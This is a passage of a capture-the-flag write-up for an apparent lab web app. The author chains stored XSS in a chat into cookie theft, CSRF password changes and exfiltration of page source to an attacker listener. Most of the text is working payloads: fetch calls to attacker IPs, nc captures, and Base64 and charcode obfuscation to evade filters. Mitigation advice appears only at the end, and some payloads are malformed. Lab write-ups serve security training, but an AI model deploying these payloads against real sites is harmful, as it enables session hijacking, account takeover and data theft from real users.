</head>
<body>
<div class="login-container">
<h1>Login</h1>
<p class="error"></p>
<form action="login.php" method="post">
<div>
<label for="username">Username</label>
<input type="text" id="username" name="username" placeholder="Enter your username" required>
</div>
<div>
<label for="password">Password</label>
<input type="password" id="password" name="password" placeholder="Enter your password" required>
</div>
<button type="submit">Login</button>
</form>
</div>
</body>
```
```bash
root@ip-:~# curl -s http://worldwap.thm:8081/home.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at worldwap.thm Port 8081</address>
</body></html>
```

Let’s try a different approach: let’s try stealing the session cookie when accessing the page http://worldwap.thm/public/html/register.php
We have the session: PHPSESSID    ‘tg6vldk84a15jq2jvce14725h4’
```
fetch('http://10.64.96.25:4444/?cookie=' + document.cookie);
```
```bash
root@ip-:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.64.96.25 48190
GET /?cookie=PHPSESSID=tg6vldk84a15jq2jvce14725h4 HTTP/1.1
Host: 10.64.96.25:4444
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: http://worldwap.thm/
Origin: http://worldwap.thm
Connection: keep-alive
Priority: u=4
```

We run ```<img src="x" onerror="fetch(“http://10.65.106.91:4444/?cookie=” + document.cookie);">```
we wait for our server to respond and finally retrieve the moderator's cookie

Session Hijacking
You are now going to impersonate the moderator using their cookie. Follow these steps exactly:

    1. Open your browser in the AttackBox and go to: http://worldwap.thm:8081/login.php
    
    2. Press F12 and go to the Console tab.
    
    3. Go to Storage and replace the cookie. 

You’ve done it! That’s the key

In nc, the connection received from IP 10.64.161.18 (which is different) has given you the moderator’s cookie: PHPSESSID=qah88tulups4bo466l6n9e8m8m
This confirms that a bot or a real administrator has fallen for your Stored XSS when checking the log.

Click on ‘Go to Chat’. In many challenges, the administrator is monitoring the internal chat. If you manage to get the admin to read a message from you in that chat containing the cookie-stealing payload, you will gain access to the Admin Area session.

```javascript
<script>alert(1)</script>
```


If Session Hijacking doesn’t work, it is very likely that the server is applying one of these two protections:
    
    1. IP/User-Agent validation: The server checks that the cookie qah8... is only used by the bot’s IP (the 10.64.161.18 we saw in your nc). When you use it from your IP, the server rejects you.
    
    2. Privilege Level Mismatch: The cookie you stole belongs to the Moderator. Even if you are a ‘Moderator’, the admin.php file or the Admin section may be strictly restricted to the user with ID 1 (Admin).

We checked via view-source:http://worldwap.thm:8081/chat.php that the chat uses InnerHTML

The bot is ‘asleep’ or on another page
In the right-hand sidebar, there is a button: Reset/Move Admin Bot to chat.php page.

The source code shows that this button calls block.php. In this challenge, the admin isn’t always monitoring the chat; you have to “invoke” it.

Click on that “Reset/Move Admin Bot” button. This will activate the bot to enter chat.php and process your pending messages.

2. The XSS is persistent and loaded via JS
Look at this part of the code:
JavaScript

```messageDiv.innerHTML = msg.message```

This confirms that the chat uses innerHTML. It is a critical vulnerability because anything you type will be executed as actual HTML/JavaScript. But there’s a problem: the chat refreshes every 5 seconds ```(setInterval(fetchMessages, 5000))```. If your message is very long or contains errors, it may break before it executes

After many attempts and investigating possible payloads, I came across this script, which I’ll explain below:

```
<img src="x" onerror="var x=new XMLHttpRequest();
```
```
x.open('POST',atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'),true)
```
```
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
```
```
x.send('action=execute&new_password=admin123');
```
```
fetch('http://10.64.96.25:4455/XHR_ENVIADO');">
```


The Trigger: The onerror attribute
```<img src="x" onerror="...">```
- Execution: As the image fails to load, the browser automatically triggers the onerror event. This is a classic way of executing JavaScript by bypassing filters that might block the ```<script>``` tag but allow image tags.


Obfuscation: Base64 (atob)
```
atob(“aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw”)
```

- Function: atob() decodes a Base64-encoded string.
    
    • Result: It is converted to http://login.worldwap.thm/change_password.php.
    
    • Purpose: Prevents security systems (such as an IDS or a WAF) from detecting the word ‘change_password’ in the chat text and blocking the message before it reaches the admin.

El Motor: XMLHttpRequest (XHR)
var x = new XMLHttpRequest();
x.open('POST', ..., true);
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

POST: Specifies that data will be sent to the server (required for changing passwords).
    • setRequestHeader: Tells the server that the data is in the standard web form format. Without this, the PHP server would likely ignore the body content.

The Payload (The Actual ‘Payload’)
```
x.send(“action=execute&new_password=admin123”);
```

This is where the magic happens. The administrator’s browser sends this string to the password-change script.
    • Action: If the server is vulnerable, it will process the request using the administrator’s session and change their password to admin123.

Success Notification (Exfiltration)
``
fetch(“http://10.64.96.25:4455/XHR_ENVIADO”);
```
Feedback: Once the XHR is sent, the script makes a quick request to your AttackBox (10.64.96.25).
    • Confirmation: When you see GET /XHR_ENVIADO in your nc terminal, you will know for certain that the code has been executed on the victim’s device.

```http
<img src="x" onerror="var x=new XMLHttpRequest();x.open('POST',atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'),true);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.send('action=execute&new_password=admin123');var u='ht'+'tp://10.64.96.25:4455/EXITO';fetch(u);">
```

```http
<img src="x" onerror="var x=new XMLHttpRequest();x.open('POST',atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'),true);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');x.send('action=execute&new_password=admin123');var u='ht'+'tp://10.64.96.25:4455/EXITO';fetch(u);">
```

```bash
root@ip-10-64-96-25:~# nc -lvnp 4455
Listening on 0.0.0.0 4455
Connection received on 10.64.96.25 35080
GET /EXITO HTTP/1.1
Host: 10.64.96.25:4455
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: http://worldwap.thm:8081/
Origin: http://worldwap.thm:8081
Connection: keep-alive
Priority: u=4
```

However, we did not receive a response in NC because the chat responds as follows: ```target="_blank">http://10.64.96.25:4455/XHR_ENVIADO');">```  which we will now explain:
When you see that the chat outputs ```target="_blank">http://...```, it means that the chat engine (possibly a PHP function or a JS library) detected a URL and automatically wrapped it in a ```< a>``` tag, breaking your JavaScript code in half.
The server transformed it into something like:

...fetch('<a href="http://10.64.96.25:4455/XHR_ENVIADO"

```
target="_blank">http://10.64.96.25:4455/XHR_ENVIADO</a>');?
```

When you include HTML tags ```(<a>)``` within your JavaScript code, the browser detects a syntax error and stops execution. That’s why your nc isn’t receiving anything: the script ‘crashes’ before it can send the signal.
To prevent the server from recognising the URL and breaking it, we need to hide the string http://.

Here is the modified payload:

```http 
<img src="x" onerror="var x=new XMLHttpRequest();
x.open('POST',atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'),true);

x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');

x.send('action=execute&new_password=admin123');

var u='ht'+'tp://10.64.96.25:4455/EXITO';fetch(u);">
``` 

Here we have the ultimate boss of web security: CORS (Cross-Origin Resource Sharing).

If you look at the errors, they say ‘CORS Failed’. The browser is blocking your requests because you are trying to make a POST to login.worldwap.thm and a GET to your IP from the page worldwap.thm:8081. The browser sees this as a cross-site attack and blocks it for security reasons.

However, there is some excellent news: nc received the /SUCCESS. That means the fetch to your IP worked (even though the browser complains afterwards). But the POST to change_password.php failed because it’s a different domain (login.worldwap.thm vs worldwap.thm).
I’ve removed http://login.worldwap.thm and replaced it with a relative path /change_password.php

```
<img src="x" onerror="var x=new XMLHttpRequest();

x.open('POST','/change_password.php',true);

x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');

x.send('new_password=admin123&confirm_password=admin123');

var u='ht'+'tp://10.64.96.25:4455/FINAL';fetch(u);">
```

Let's keep it as simple as possible (Debug Mode)
To find out exactly what's going wrong, we're going to use a payload that tells us which step the browser gets stuck on. Send this to the chat:

```http
<img src="x" onerror="fetch('change_password.php').then(r=>{ fetch('http://10.64.96.25:4455/STATUS_'+r.status); }).catch(e=>{ fetch('http://10.64.96.25:4455/ERROR'); });">
```

    • If you receive /STATUS_200: The file exists and the Admin can read it.

    • If you receive /STATUS_404: The file does not have that name or is not in that folder.

    • If you receive /ERROR: There is a CORS or network issue blocking the initial request.

But we didn’t get a response.

If you look at the blue bubble, the chat has turned part of your code into a blue underlined link and cut off the rest. This happens because the chat’s ‘auto-link’ system detects http:// and wraps that part in a ```<a>``` tag, breaking the JavaScript syntax. The Admin’s browser sees gibberish, not executable code


We’re going to use `String.fromCharCode` to reconstruct the URL from your IP address and a relative path to the PHP file. That way, the chat won’t see anything that looks like a link.

```http
<img src="x" onerror="var u=String.fromCharCode(104,116,116,112,58,47,47,49,48,46,54,52,46,57,54,46,50,53,58,52,52,53,53,47);fetch('change_password.php').then(r=>{fetch(u+'STATUS_'+r.status);}).catch(e=>{fetch(u+'ERROR');});">
```
Check your nc:
    • If you receive /STATUS_200: The file exists! We can proceed with the change.

    • If you receive /STATUS_404: The file is not in that folder.

Success! The 200 status code in change_password.php and the STATUS_200 notification sent to your IP address confirm that the administrator has run the script and that the file exists.

Now that we’ve cleared the way and know that the bot can read the file, let’s launch the final attack.
This script will make the administrator send a POST request with the new password admin123

```http
<img src="x" onerror="var u=String.fromCharCode(104,116,116,112,58,47,47,49,48,46,54,52,46,57,54,46,50,53,58,52,52,53,53,47); var x=new XMLHttpRequest(); x.open('POST','change_password.php',true); x.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); x.send('username=admin&new_password=admin123&confirm_password=admin123'); x.onreadystatechange=function(){if(x.readyState==4){fetch(u+'CAMBIO_REALIZADO');}}; ">
```

to map the attack surface and check whether the administrator has left any forgotten files (such as .bak backup files or .env configuration files) in the root directory. Since the Admin Bot has an active Moderator session, we can use its context to ‘browse’ through the server’s directories.

This script will attempt to fetch the server root (/) and send the HTML content (where the files usually appear if Directory Listing is enabled) to your IP address.

```javascript
<script> (function() { var u = atob(“aHR0cDovLzEwLjY0Ljk2LjI1OjQ0NTUv”); 
// Your IP:Port // We try to read the server root fetch(“/”) .then(response => response.text()) .then(data => { // We send the first 1000 characters of the file listing to your nc fetch(u + “?dir_listing=” + btoa(data.substring(0, 1000))); }) .catch(err => { fetch(u + “?error=failed_to_list”); }); })(); </script>
```
```
<img src="x" onerror="var u=atob('aHR0cDovLzEwLjY0Ljk2LjI1OjQ0NTUv'); fetch('/').then(r=>r.text()).then(d=>fetch(u+'?res='+btoa(d.substring(0,500))));">
```
```bash
root@ip-:~# echo "PCEtLSBsb2dpbi5waHAgc2hvdWxkIGJlIHVwZGF0ZWQgYnkgTW9uZGF5IGZvciBwcm9wZXIgcmVkaXJlY3Rpb24gLS0 Cg==" | base64 -d
```

```<!-- login.php should be updated by Monday to ensure proper redirection --base64: invalid input  -->```
The bot scans the server root and sends you a list of files encoded in Base64.

Code Exfiltration Attack (If the admin panel is blocked)
If you discover that the admin panel is admin.php but cannot log in even with the moderator cookie, use this script so that the bot (which has higher privileges) sends us the source code for that page. The flag is usually found there.

```
<img src="x" onerror="var u=atob('aHR0cDovLzEwLjY0Ljk2LjI1OjQ0NTUv'); fetch('admin.php').then(r=>r.text()).then(d=>fetch(u+'?code='+btoa(d.substring(0,1000))));">
```
That decoded result is a 404 Not Found error. This means that the admin.php file does not exist at that path, or the bot does not have permission to view it from that location.

- Test Parameter Redirection
Try accessing the login URL by adding common redirection parameters to see if the server accepts them:

    • http://worldwap.thm:8081/login.php?redirect=admin.php

    • http://worldwap.thm:8081/login.php?url=admin.php

    • http://worldwap.thm:8081/login.php?next=admin.php

None of them worked.
(Exfiltration of location.href)
Sometimes the bot isn’t on chat.php, but on an internal admin interface. We’ll ask it to send us its current URL.

The ‘Redirection’ in login.php
If the comment mentioned that login.php has redirection flaws, try to see if the bot can access a path that would normally return a 302 (redirect) but which is accessible to it.
Try this payload to read the root directory again, but this time specifically looking for .php files:

```http
img src="x" onerror="var u=atob('aHR0cDovLzEwLjY0Ljk2LjI1OjQ0NTUv'); fetch('.').then(r=>r.text()).then(d=>fetch(u+'?archivos='+btoa(d)));">
```

### File ‘Brute-force’ script (Reconnaissance)
We’re going to ask the bot to try loading several common filenames. If one returns anything other than a 404, it will let us know.

```http
<img src="x" onerror="var u=atob('aHR0cDovLzEwLjY0Ljk2LjI1OjQ0NTUv'); var files=['dashboard.php','panel.php','control.php','administrator.php','internal.php','secret.php']; files.forEach(f => { fetch(f).then(r => { if(r.status==200) fetch(u+'?encontrado='+f); }); });">
```

### Extract the redirect code from login.php
Since the developer mentioned that the redirect needs updating, let’s take a look at exactly what that file does. Perhaps the name of the hidden control panel is revealed there.

```http
<img src="x" onerror="var u=atob('aHR0cDovLzEwLjY0Ljk2LjI1OjQ0NTUv'); fetch('login.php').then(r=>r.text()).then(d=>fetch(u+'?login_source='+btoa(d.substring(0,1000))));">
```

The Base64 string you obtained is incomplete (it ends with ...QWRqdXN0IHNwYWM==, which is simply a CSS style description). However, the start of the decoding reveals something very important: the bot is not sending you the code from login.php, but rather the code from its own Profile page.

This happens because when you call `fetch(“login.php”)`, if the bot is already logged in, the server automatically redirects it to its home page or profile page

### New Strategy: Exfiltrating the login.php file
Since the comment explicitly mentioned that login.php has redirection issues, we’re going to instruct the bot to read the source code of that file. It’s highly likely that the name of the actual control panel is written in the PHP redirection code.

```http
<img src="x" onerror="var u=atob(“aHR0cDovLzEwLjY0Ljk2LjI1OjQ0NTUv”); fetch(“login.php”).then(r=>r.text()).then(d=>fetch(u+“?login_src=”+btoa(d.substring(0,1000))));">
```

Finally, the last flag.
To achieve this, we adapted the following script so that it could be executed in the chat:

```javascript
<script>
var xhr = new XMLHttpRequest();
// La cadena en atob decodifica a: http://10.64.96.25:4455/
xhr.open('POST', 'change_password.php', true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Notifica a tu terminal cuando el bot ejecute la acci�n
fetch(atob('aHR0cDovLzEwLjY0Ljk2LjI1OjQ0NTUv') + 'CAMBIO_EXITOSO');
}
};
// We only send the required parameter as specified in the website form
xhr.send('new_password=admin123');
</script>

```

This payload is a classic example of a Stored XSS (Cross-Site Scripting) attack designed to carry out a CSRF (Cross-Site Request Forgery) attack. Its aim is to force another user’s browser (in this case, an administrator or bot) to make a technical request without their consent.

### The trigger
    • <img src="x" ...>: The attacker uses an image tag with a fake path (src=‘x’).

    • onerror="...": As the image does not exist, the browser automatically triggers the error event, executing the JavaScript code contained in the attribute immediately and without any user interaction.

### The logic of the request (XMLHttpRequest)
The script creates an object to communicate with the server in the background:

    • var xhr = new XMLHttpRequest();: Initialises the request.

    • xhr.open(“POST”, “change_password.php”, true);: Defines the destination. In this case, it points to the file responsible for changing passwords on the server.

    • xhr.setRequestHeader(...): Configures the headers so that the server believes a legitimate web form is being sent.

### Obfuscation and Exfiltration (Base64)

    • atob(“aHR0cDovLzEwLjY0Ljk2LjI1OjQ0NTUv”): This is an evasion technique. It decodes a Base64-encoded string that translates to an IP address and a port (http://10.64.96.25:4455/). This is done to prevent security filters from detecting the URL in plain text.

    • fetch(...) + “SUCCESS”: If the request is successful (status === 200), the script sends a signal to the attacker’s machine to confirm that the attack worked.

### The payload (The objective)
    • xhr.send(“new_password=admin123”);: This is the final action. It sends the instruction to the server to change the password for the current session to admin123. When executed by an administrator, the server processes the change using that account’s privileges.

### Vulnerability Summary
This attack is possible because the website:

  
    1. Input is not sanitised: It allows characters such as < > to be stored in the database and rendered in the chat.

    2. Lack of CSRF tokens: The password reset form does not validate that the request was intentionally generated by the user, allowing an external script to ‘hijack’ the session.

### Mitigation Strategies (Remediation)

To prevent this exploit chain and strengthen the application’s security posture, the following controls should be implemented:

1. Input Sanitisation & Output Encoding (Anti-XSS)

The root cause was a lack of filtering in the birthday component.

    Sanitisation: Implement libraries such as DOMPurify on the frontend to remove any <script> tags or onmouseover attributes before processing the data.

    Encoding: Use output encoding techniques to convert characters such as < and > into HTML entities (&lt; and &gt;), preventing the browser from executing them as code.

2. Implementation of Anti-CSRF Tokens

The attack on the administrator worked because the password change form did not validate the user’s intent.

    Synchronizer Token Pattern: A unique, secret and random token must be generated for each user session and included in every POST request. If the token does not match, the server must reject the request.

3. Content Security Policy (CSP)

Configure a robust content security policy using HTTP headers:

    Content-Security-Policy: default-src “self”; script-src “self”;

    This would prevent the browser from executing scripts loaded from external domains or unauthorised inline scripts, blocking the attacker’s payload even if they manage to inject it.

4. HTTP-Only & Secure Cookies

To prevent session hijacking:

    Set the HttpOnly flag on session cookies so that they cannot be accessed via JavaScript (document.cookie), thereby mitigating the impact of an XSS attack.